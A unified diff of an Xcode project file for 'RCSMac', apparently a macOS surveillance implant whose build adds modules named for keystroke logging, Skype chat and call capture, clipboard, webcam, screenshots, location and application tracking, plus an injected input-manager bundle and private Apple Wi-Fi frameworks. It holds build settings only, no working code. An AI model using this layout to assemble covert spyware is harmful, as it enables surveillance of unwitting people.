@@ -38,10 +38,8 @@
 		1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */; };
 		1A28786D12F062A80008973A /* UploadNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28786C12F062A80008973A /* UploadNetworkOperationTest.m */; };
 		1A28798612F080B20008973A /* FSNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A28798512F080B20008973A /* FSNetworkOperationTest.m */; };
-		1A319E4B0FA895AD0079B060 /* RCSMInputManager.bundle in CopyFiles */ = {isa = PBXBuildFile; fileRef = 1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */; };
 		1A319EE50FA9B6410079B060 /* RCSMInputManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A319EE40FA9B6410079B060 /* RCSMInputManager.m */; };
 		1A319F090FA9C8260079B060 /* Info in Resources */ = {isa = PBXBuildFile; fileRef = 1A319F080FA9C8260079B060 /* Info */; };
-		1A319F0D0FA9C85A0079B060 /* Info in CopyFiles */ = {isa = PBXBuildFile; fileRef = 1A319F080FA9C8260079B060 /* Info */; };
 		1A319F1F0FA9ED520079B060 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
 		1A319F880FAA02640079B060 /* RCSMCommon.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A4436580F8CD55400CD910E /* RCSMCommon.m */; };
 		1A33F4B20FC69D1800590FA1 /* RCSMTaskManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AF92B710F8F4A90009ED774 /* RCSMTaskManager.m */; };
@@ -55,7 +53,6 @@
 		1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A508A9C11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m */; };
 		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
 		1A521EC512FAB9550091ADD5 /* UpgradeNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */; };
-		1A521ECA12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */; };
 		1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */; };
 		1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */; };
 		1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */; };
@@ -88,7 +85,6 @@
 		1AAF6FC912FB0A7E00D3E581 /* RCSMLoggerTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AAF6FC812FB0A7E00D3E581 /* RCSMLoggerTest.m */; };
 		1AAF6FCE12FB0B2900D3E581 /* RCSMLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A13FE4512F9B4F800B82938 /* RCSMLogger.m */; };
 		1AB5DC4111CF9DE600B9E32B /* NSApplication+SystemVersion.m in Sources */ = {isa = PBXBuildFile; fileRef = 1AB5DC4011CF9DE600B9E32B /* NSApplication+SystemVersion.m */; };
-		1ABE7CDF0F7BA0A800BC61B1 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
 		1ABE7E7B0F7CE6ED00BC61B1 /* RCSMUtils.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7E7A0F7CE6ED00BC61B1 /* RCSMUtils.m */; };
 		1ABEEE2E0F975CE100063113 /* RCSMCore.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABEEE2D0F975CE100063113 /* RCSMCore.m */; };
 		1AD1D6C11099EB96005B548F /* QTKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A12A0F11095BD350090C4D7 /* QTKit.framework */; };
@@ -130,25 +126,18 @@
 		1AF60C4212F028A00091F6F6 /* OCMock.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1AF60C4112F028A00091F6F6 /* OCMock.framework */; };
 		1AF610290FA75A2B003F2C12 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
 		1AF92CB10F947D53009ED774 /* spref.tiff in Resources */ = {isa = PBXBuildFile; fileRef = 1AF92CB00F947D53009ED774 /* spref.tiff */; };
+		521A4BC0132A7CCB00050AE6 /* SPSupport in Frameworks */ = {isa = PBXBuildFile; fileRef = 521A4BBF132A7CCB00050AE6 /* SPSupport */; };
+		521ABB3A132F9FDF00DC54A8 /* Apple80211 in Frameworks */ = {isa = PBXBuildFile; fileRef = 521ABB39132F9FDF00DC54A8 /* Apple80211 */; };
+		521ABB3C132FA01B00DC54A8 /* SystemConfiguration.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */; };
+		521B22C61312BA360077A491 /* RCSMAgentPosition.m in Sources */ = {isa = PBXBuildFile; fileRef = 521B22C51312BA360077A491 /* RCSMAgentPosition.m */; };
 		521DA5FE125C884000A3D49E /* ScriptingBridge.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 521DA5FD125C884000A3D49E /* ScriptingBridge.framework */; };
+		5262A948132A5AB4001D1988 /* RCSMAgentDevice.m in Sources */ = {isa = PBXBuildFile; fileRef = 5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */; };
+		5262A949132A6755001D1988 /* RCSMSharedMemory.m in Sources */ = {isa = PBXBuildFile; fileRef = 1ABE7CDE0F7BA0A800BC61B1 /* RCSMSharedMemory.m */; };
+		5269F6231330ED7200644B72 /* RCSMAgentApplication.m in Sources */ = {isa = PBXBuildFile; fileRef = 5269F6221330ED7200644B72 /* RCSMAgentApplication.m */; };
 		8D11072B0486CEB800E47090 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 089C165CFE840E0CC02AAC07 /* InfoPlist.strings */; };
 		8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 29B97316FDCFA39411CA2CEA /* RCSMMain.m */; settings = {ATTRIBUTES = (); }; };
 		8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXCopyFilesBuildPhase section */
-		1AF610640FA75C18003F2C12 /* CopyFiles */ = {
-			isa = PBXCopyFilesBuildPhase;
-			buildActionMask = 2147483647;
-			dstPath = RCSMInputManager;
-			dstSubfolderSpec = 16;
-			files = (
-				1A319E4B0FA895AD0079B060 /* RCSMInputManager.bundle in CopyFiles */,
-				1A319F0D0FA9C85A0079B060 /* Info in CopyFiles */,
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-		};
-/* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
 		089C165DFE840E0CC02AAC07 /* English */ = {isa = PBXFileReference; fileEncoding = 10; lastKnownFileType = text.plist.strings; name = English; path = English.lproj/InfoPlist.strings; sourceTree = "<group>"; };
@@ -294,7 +283,28 @@
 		29B97325FDCFA39411CA2CEA /* Foundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = Foundation.framework; path = /System/Library/Frameworks/Foundation.framework; sourceTree = "<absolute>"; };
 		32CA4F630368D1EE00C91783 /* RCSMac_Prefix.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMac_Prefix.pch; sourceTree = "<group>"; };
 		520FE2131265E20B00F31B58 /* RCSMOsaxFiles.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RCSMOsaxFiles.h; sourceTree = "<group>"; };
+		521A4BBF132A7CCB00050AE6 /* SPSupport */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = SPSupport; path = System/Library/PrivateFrameworks/SPSupport.framework/Versions/A/SPSupport; sourceTree = SDKROOT; };
+		521ABB39132F9FDF00DC54A8 /* Apple80211 */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.dylib"; name = Apple80211; path = System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Apple80211; sourceTree = SDKROOT; };
+		521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SystemConfiguration.framework; path = System/Library/Frameworks/SystemConfiguration.framework; sourceTree = SDKROOT; };
+		521B22C41312BA360077A491 /* RCSMAgentPosition.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentPosition.h; path = Agents/RCSMAgentPosition.h; sourceTree = "<group>"; };
+		521B22C51312BA360077A491 /* RCSMAgentPosition.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentPosition.m; path = Agents/RCSMAgentPosition.m; sourceTree = "<group>"; };
 		521DA5FD125C884000A3D49E /* ScriptingBridge.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ScriptingBridge.framework; path = System/Library/Frameworks/ScriptingBridge.framework; sourceTree = SDKROOT; };
+		5250ED2613097EA60058AE63 /* ffurl.mm */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.objcpp; path = ffurl.mm; sourceTree = "<group>"; };
+		5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentClipboard.h; path = Agents/RCSMAgentClipboard.h; sourceTree = "<group>"; };
+		5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentClipboard.m; path = Agents/RCSMAgentClipboard.m; sourceTree = "<group>"; };
+		5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentIMSkype.h; path = Agents/RCSMAgentIMSkype.h; sourceTree = "<group>"; };
+		5262A92E132A5A2C001D1988 /* RCSMAgentIMSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentIMSkype.m; path = Agents/RCSMAgentIMSkype.m; sourceTree = "<group>"; };
+		5262A92F132A5A2C001D1988 /* RCSMAgentInputLogger.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentInputLogger.h; path = Agents/RCSMAgentInputLogger.h; sourceTree = "<group>"; };
+		5262A930132A5A2C001D1988 /* RCSMAgentInputLogger.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentInputLogger.m; path = Agents/RCSMAgentInputLogger.m; sourceTree = "<group>"; };
+		5262A937132A5A2C001D1988 /* RCSMAgentURL.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentURL.h; path = Agents/RCSMAgentURL.h; sourceTree = "<group>"; };
+		5262A938132A5A2C001D1988 /* RCSMAgentURL.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentURL.m; path = Agents/RCSMAgentURL.m; sourceTree = "<group>"; };
+		5262A939132A5A2C001D1988 /* RCSMAgentVoipSkype.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentVoipSkype.h; path = Agents/RCSMAgentVoipSkype.h; sourceTree = "<group>"; };
+		5262A93A132A5A2C001D1988 /* RCSMAgentVoipSkype.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentVoipSkype.m; path = Agents/RCSMAgentVoipSkype.m; sourceTree = "<group>"; };
+		5262A946132A5AB4001D1988 /* RCSMAgentDevice.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentDevice.h; path = Agents/RCSMAgentDevice.h; sourceTree = "<group>"; };
+		5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentDevice.m; path = Agents/RCSMAgentDevice.m; sourceTree = "<group>"; };
+		5269F6211330ED7200644B72 /* RCSMAgentApplication.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentApplication.h; path = Agents/RCSMAgentApplication.h; sourceTree = "<group>"; };
+		5269F6221330ED7200644B72 /* RCSMAgentApplication.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentApplication.m; path = Agents/RCSMAgentApplication.m; sourceTree = "<group>"; };
+		5276E4C613155100005155B8 /* CoreWLAN.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreWLAN.framework; path = SDKs/MacOSX10.6.sdk/System/Library/Frameworks/CoreWLAN.framework; sourceTree = DEVELOPER_DIR; };
 		8D1107310486CEB800E47090 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		8D1107320486CEB800E47090 /* RCSMac.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RCSMac.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -336,6 +346,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				521ABB3C132FA01B00DC54A8 /* SystemConfiguration.framework in Frameworks */,
 				8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */,
 				1A43C9660FFA641A008E5EFE /* IOKit.framework in Frameworks */,
 				1AD53606101067D800AC54D8 /* Security.framework in Frameworks */,
@@ -348,6 +359,8 @@
 				1AF15F1811DC8E0100637F4E /* AppKit.framework in Frameworks */,
 				521DA5FE125C884000A3D49E /* ScriptingBridge.framework in Frameworks */,
 				1AD4328812A3E3CF00B472C3 /* AddressBook.framework in Frameworks */,
+				521A4BC0132A7CCB00050AE6 /* SPSupport in Frameworks */,
+				521ABB3A132F9FDF00DC54A8 /* Apple80211 in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -530,6 +543,8 @@
 				1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */,
 				1A281C980FF3CAC800616589 /* RCSMAgentClipboard.h */,
 				1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */,
+				5269F6211330ED7200644B72 /* RCSMAgentApplication.h */,
+				5269F6221330ED7200644B72 /* RCSMAgentApplication.m */,
 			);
 			name = Agents;
 			sourceTree = "<group>";
@@ -628,12 +643,26 @@
 		1AE6B5610F8E2574004736EA /* Agents */ = {
 			isa = PBXGroup;
 			children = (
+				5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */,
+				5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */,
+				5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */,
+				5262A92E132A5A2C001D1988 /* RCSMAgentIMSkype.m */,
+				5262A92F132A5A2C001D1988 /* RCSMAgentInputLogger.h */,
+				5262A930132A5A2C001D1988 /* RCSMAgentInputLogger.m */,
+				5262A937132A5A2C001D1988 /* RCSMAgentURL.h */,
+				5262A938132A5A2C001D1988 /* RCSMAgentURL.m */,
+				5262A939132A5A2C001D1988 /* RCSMAgentVoipSkype.h */,
+				5262A93A132A5A2C001D1988 /* RCSMAgentVoipSkype.m */,
 				1A1A2FD110611075001F1B5D /* RCSMAgentWebcam.h */,
 				1A1A2FCF10611067001F1B5D /* RCSMAgentWebcam.m */,
 				1A1B9D390FA0AD670036558C /* RCSMAgentScreenshot.h */,
 				1A1B9D3A0FA0AD670036558C /* RCSMAgentScreenshot.m */,
 				1AFBE66312A0082600BFA7D0 /* RCSMAgentOrganizer.h */,
 				1AFBE66412A0082600BFA7D0 /* RCSMAgentOrganizer.m */,
+				521B22C41312BA360077A491 /* RCSMAgentPosition.h */,
+				521B22C51312BA360077A491 /* RCSMAgentPosition.m */,
+				5262A946132A5AB4001D1988 /* RCSMAgentDevice.h */,
+				5262A947132A5AB4001D1988 /* RCSMAgentDevice.m */,
 			);
 			name = Agents;
 			sourceTree = "<group>";
@@ -680,6 +709,7 @@
 		1AF610010FA72D50003F2C12 /* InputManager */ = {
 			isa = PBXGroup;
 			children = (
+				5250ED2613097EA60058AE63 /* ffurl.mm */,
 				1A68E0230FB87A9300B17F60 /* Agents */,
 				1A319EE30FA9B6410079B060 /* RCSMInputManager.h */,
 				1A319EE40FA9B6410079B060 /* RCSMInputManager.m */,
@@ -691,6 +721,10 @@
 		29B97314FDCFA39411CA2CEA /* RCSMac */ = {
 			isa = PBXGroup;
 			children = (
+				521ABB3B132FA01B00DC54A8 /* SystemConfiguration.framework */,
+				521ABB39132F9FDF00DC54A8 /* Apple80211 */,
+				521A4BBF132A7CCB00050AE6 /* SPSupport */,
+				5276E4C613155100005155B8 /* CoreWLAN.framework */,
 				1A10798712E722440063759B /* Tests */,
 				1AE6B5620F8E2581004736EA /* Core */,
 				1AF610010FA72D50003F2C12 /* InputManager */,
@@ -766,7 +800,6 @@
 				1AF610050FA72D87003F2C12 /* Resources */,
 				1AF610060FA72D87003F2C12 /* Sources */,
 				1AF610070FA72D87003F2C12 /* Frameworks */,
-				1AF610640FA75C18003F2C12 /* CopyFiles */,
 				1A319E540FA896480079B060 /* Rez */,
 			);
 			buildRules = (
@@ -908,7 +941,6 @@
 				1A7FD44212F1D29D00361B0B /* RCSMFileSystemManager.m in Sources */,
 				1A7FD44112F1D28100361B0B /* RCSMFileSystemManagerTest.m in Sources */,
 				1A521EC512FAB9550091ADD5 /* UpgradeNetworkOperationTest.m in Sources */,
-				1A521ECA12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */,
 				1AAF6FC912FB0A7E00D3E581 /* RCSMLoggerTest.m in Sources */,
 				1AAF6FCE12FB0B2900D3E581 /* RCSMLogger.m in Sources */,
 			);
@@ -928,6 +960,7 @@
 				1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */,
 				1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */,
 				1A13FE4712F9B4F800B82938 /* RCSMLogger.m in Sources */,
+				5269F6231330ED7200644B72 /* RCSMAgentApplication.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -935,8 +968,8 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				5262A949132A6755001D1988 /* RCSMSharedMemory.m in Sources */,
 				8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */,
-				1ABE7CDF0F7BA0A800BC61B1 /* RCSMSharedMemory.m in Sources */,
 				1ABE7E7B0F7CE6ED00BC61B1 /* RCSMUtils.m in Sources */,
 				1A4435230F8CA23E00CD910E /* NSMutableData+AES128.m in Sources */,
 				1AA1376C12F6FA7100E0CD52 /* NSMutableData+SHA1.m in Sources */,
@@ -970,6 +1003,8 @@
 				1AA1373C12F6EFDD00E0CD52 /* RESTNetworkProtocol.m in Sources */,
 				1A13FE4612F9B4F800B82938 /* RCSMLogger.m in Sources */,
 				1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */,
+				521B22C61312BA360077A491 /* RCSMAgentPosition.m in Sources */,
+				5262A948132A5AB4001D1988 /* RCSMAgentDevice.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1064,21 +1099,31 @@
 				GCC_OPTIMIZATION_LEVEL = 0;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					XPCOM_GLUE,
+					MOZILLA_STRICT_API,
+				);
+				GCC_VERSION = "";
+				HEADER_SEARCH_PATHS = "";
 				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
 				INSTALL_PATH = "$(HOME)/Library/Bundles";
 				LIBRARY_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SRCROOT)/../../../Desktop\"",
 					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)/Support/mozilla\"",
 				);
+				ONLY_ACTIVE_ARCH = NO;
 				OTHER_LDFLAGS = (
 					"-framework",
 					Foundation,
 					"-framework",
 					AppKit,
+					"-fshort-wchar",
 				);
 				PREBINDING = NO;
 				PRODUCT_NAME = RCSMInputManager;
+				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 			};
 			name = Debug;
@@ -1094,12 +1139,19 @@
 				GCC_MODEL_TUNING = G5;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					XPCOM_GLUE,
+					MOZILLA_STRICT_API,
+				);
+				GCC_VERSION = "";
+				HEADER_SEARCH_PATHS = "";
 				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
 				INSTALL_PATH = "$(HOME)/Library/Bundles";
 				LIBRARY_SEARCH_PATHS = (
 					"$(inherited)",
 					"\"$(SRCROOT)/../../../Desktop\"",
 					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)/Support/mozilla\"",
 				);
 				ONLY_ACTIVE_ARCH = NO;
 				OTHER_LDFLAGS = (
@@ -1107,10 +1159,12 @@
 					Foundation,
 					"-framework",
 					AppKit,
+					"-fshort-wchar",
 				);
 				PREBINDING = NO;
 				PRODUCT_NAME = RCSMInputManager;
 				SDKROOT = macosx10.5;
+				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 				ZERO_LINK = NO;
 			};
@@ -1133,8 +1187,13 @@
 					"$(inherited)",
 					"\"$(SRCROOT)/Support/Speex\"",
 					"\"$(SRCROOT)\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/SPSupport.framework/Versions/A\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/Apple80211.framework/Versions/A\"",
 				);
+				ONLY_ACTIVE_ARCH = YES;
 				PRODUCT_NAME = RCSMac;
+				SDKROOT = macosx10.5;
+				VALID_ARCHS = i386;
 			};
 			name = Debug;
 		};
@@ -1152,8 +1211,13 @@
 					"$(inherited)",
 					"\"$(SRCROOT)/Support/Speex\"",
 					"\"$(SRCROOT)\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/SPSupport.framework/Versions/A\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/Apple80211.framework/Versions/A\"",
 				);
+				ONLY_ACTIVE_ARCH = YES;
 				PRODUCT_NAME = RCSMac;
+				SDKROOT = macosx10.5;
+				VALID_ARCHS = i386;
 			};
 			name = Release;
 		};
@@ -1201,7 +1265,7 @@
 				GCC_GENERATE_DEBUGGING_SYMBOLS = NO;
 				GCC_PREPROCESSOR_DEFINITIONS = "";
 				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
-				GCC_VERSION = 4.0;
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
 				GCC_WARN_ABOUT_MISSING_PROTOTYPES = NO;
 				GCC_WARN_ABOUT_POINTER_SIGNEDNESS = YES;
 				GCC_WARN_ABOUT_RETURN_TYPE = YES;
